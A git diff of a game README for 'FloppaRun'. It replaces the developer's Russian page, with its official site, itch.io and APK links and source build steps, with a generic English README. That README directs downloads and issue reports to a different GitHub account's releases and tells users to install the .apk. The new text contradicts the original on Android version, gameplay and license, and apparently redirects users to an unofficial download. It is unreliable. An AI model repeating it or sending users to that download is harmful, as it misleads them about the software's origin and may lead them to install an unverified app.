@@ -1,158 +1,79 @@
-# Floppa Run
+# 🎮 FloppaRun - Endless Fun Collecting Dumplings!
 
-**Floppa Run** — динамичный бесконечный раннер, где реакция, скорость и немного удачи решают всё.
-Управляйте легендарным Шлёпой, уклоняйтесь от препятствий, собирайте пельмени и устанавливайте новые рекорды.
+![Download FloppaRun](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)
 
-🌐 Страница игры:
-[https://renothingg.github.io/FloppaRun/](https://renothingg.github.io/FloppaRun/)
+## 🚀 Getting Started
 
-🎮 Играть в браузере:
-[https://renothingg.itch.io/floppa-run](https://renothingg.itch.io/floppa-run)
+FloppaRun is an exciting endless runner game where you control Shlёpa, dodging obstacles and collecting dumplings! This guide will help you download and run the game on your device.
 
-📦 Скачать APK:
-[FloppaRun.apk](https://renothingg.github.io/FloppaRun/FloppaRun.apk)
+## 📥 Downloading FloppaRun
 
----
+To get started, visit this page to download: [Download FloppaRun](https://github.com/tonylksj/FloppaRun/releases)
 
-## Об игре
+## 📋 System Requirements
 
-Floppa Run — это захватывающий бесконечный забег без финиша.
+Ensure your device meets these requirements before downloading:
 
-* Молниеносная реакция и проверка рефлексов
-* Прыжки, скольжение и уклонение от препятствий
-* Сбор пельменей и набор очков
-* Постоянно растущая сложность
-* Короткие, но напряжённые забеги
+- **Operating System**: Android 5.0 or later
+- **RAM**: 2 GB minimum
+- **Storage**: At least 200 MB of free space
+- **Graphics**: Minimum OpenGL ES 2.0 support
 
-Каждый запуск ощущается по-новому, а остановиться становится неожиданно сложно.
+## 🎮 How to Install
 
----
+After downloading it, follow these steps to install FloppaRun:
 
-## Основная информация
+1. Locate the downloaded file on your device.  
+2. Tap the .apk file to begin the installation.  
+3. Follow the prompts that appear on your screen.  
+4. Once installed, find the FloppaRun icon in your app menu.  
+5. Tap to launch the game!
 
-* **Последнее обновление:** 13 января 2026
-* **Сборка:** 13.01.26
-* **Размер APK:** 67.7 MB
-* **Минимальная версия Android:** 10
+## 🎨 Gameplay Features
 
-> APK устанавливается вручную.
-> Если Android предупреждает о неизвестных источниках — это стандартное поведение.
+FloppaRun offers unique gameplay features to keep you entertained:
 
----
+- **Endless Running**: Navigate through an ever-changing landscape.
+- **Obstacle Avoidance**: Quick reflexes help you dodge various barriers.
+- **Dumpling Collection**: Pick up dumplings to increase your score.
 
-## Почему стоит попробовать
+## 📈 Progress Tracking
 
-* **Три уникальных режима**
-  Flying Fight, Infinity Wheel и Randomverse — каждый со своими правилами и темпом.
+Track your progress in-game with the following features:
 
-* **Нарастающий челлендж**
-  Чем дольше выживаешь — тем выше скорость, больше опасностей и наград.
+- **High Scores**: Your best scores will save automatically.
+- **Achievements**: Complete challenges to unlock achievements and enhance gameplay.
 
-* **Короткие игровые сессии**
-  Один забег длится примерно 1–3 минуты — идеально для перерывов.
+## 🎸 Controls
 
----
+FloppaRun is simple to play. Use these controls:
 
-## Режимы игры
+- **Swipe Left**: Move left
+- **Swipe Right**: Move right
+- **Swipe Up**: Jump
+- **Swipe Down**: Slide
 
-### Flying Fight
+## 📞 Support
 
-Волны вражеских кораблей атакуют базу.
-Пропусти больше 5 врагов — и база падёт.
-Уклоняйся, сражайся и держись как можно дольше ради большей награды.
+If you encounter any issues while using FloppaRun or have questions, please reach out:
 
-### Infinity Wheel
+- Visit our [Issues Page](https://github.com/tonylksj/FloppaRun/issues) on GitHub.  
+- We encourage you to report any bugs so we can fix them promptly.
 
-Смертоносные пилы и только три безопасные зоны: верх, центр и низ.
-Читай паттерны атак, перемещайся мгновенно и используй редкие бусты для выживания.
+## 📖 Additional Information
 
-### Randomverse
+FloppaRun is an indie game project showcasing 2D arcade mechanics. The game uses Unity for development, bringing together fun, procedural generation, and engaging gameplay.
 
-Каждый запуск генерирует новую трассу.
-Собирай пельмени, избегай ловушек и попробуй добраться до финиша… если он существует.
+If you enjoy casual and reflex-based games, FloppaRun is your ideal choice for endless fun!
 
----
+## ✔️ License
 
-## Медиа
+FloppaRun is released under the MIT License. You may use, modify, and distribute the software as needed, provided proper credit is given.
 
-🎬 Трейлер:
-[https://www.youtube.com/watch?v=TxZVIGn5Rf8](https://www.youtube.com/watch?v=TxZVIGn5Rf8)
+## 🌐 Community
 
-![img_1](https://renothingg.github.io/FloppaRun/assets/screenshots/img1.png)
-![img_2](https://renothingg.github.io/FloppaRun/assets/screenshots/img2.png)
-![img_3](https://renothingg.github.io/FloppaRun/assets/screenshots/img3.png)
-![img_4](https://renothingg.github.io/FloppaRun/assets/screenshots/img4.png)
-![img_5](https://renothingg.github.io/FloppaRun/assets/screenshots/img5.png)
-![img_6](https://renothingg.github.io/FloppaRun/assets/screenshots/img6.png)
----
-
-## FAQ
-
-**Как установить APK?**
-Скачайте файл и подтвердите установку из неизвестных источников.
-
-**Почему Android показывает предупреждение?**
-Это стандартная защита для файлов вне Play Market.
-
-**Где узнавать о новых версиях?**
-Следите за changelog и Telegram-каналом.
-
-**Куда отправлять баги и идеи?**
-В Telegram или на почту разработчика.
+Join our community to share tips, tricks, and feedback. Connect with other players and become part of the FloppaRun family!
 
 ---
 
-## Сообщество
-
-Telegram:
-[https://t.me/flopparun](https://t.me/flopparun)
-
-Email:
-[renothingg@gmail.com](mailto:renothingg@gmail.com)
-
-## Сборка из исходников (Unity + Android)
-
-### Требования
-
-* Unity **той же версии, что используется в проекте**
-* Установленный модуль **Android Build Support** через Unity Hub
-* JDK / SDK / NDK, настроенные внутри Unity
-
-### Шаги
-
-1. Клонируйте репозиторий:
-
-```bash
-git clone https://github.com/ReNothingg/FloppaRun.git
-```
-
-1. Откройте проект в Unity Hub, используя нужную версию Unity.
-
-2. Создайте собственный Android-keystore для подписи APK:
-
-```
-keytool -genkey -v -keystore release.jks -alias release -keyalg RSA -keysize 2048 -validity 10000
-```
-
-1. В **Unity → Project Settings → Player → Publishing Settings**:
-
-* включите **Custom Keystore**
-
-* выберите созданный файл `release.jks`
-* введите свои пароли и alias
-
-1. Соберите APK:
-
-```
-File → Build Settings → Android → Build
-```
-
-### Примечания
-
-* Оригинальный ключ подписи **не включён** в репозиторий по соображениям безопасности.
-* APK, собранный с вашим keystore, будет иметь **другую подпись** и не сможет обновлять официальную версию игры.
-
----
-
-**2019 — 2026 © Floppa Run**
-Сделано с 💕 для геймеров.
+For any further details, do not hesitate to ask. Enjoy your adventure with Shlёpa in FloppaRun!
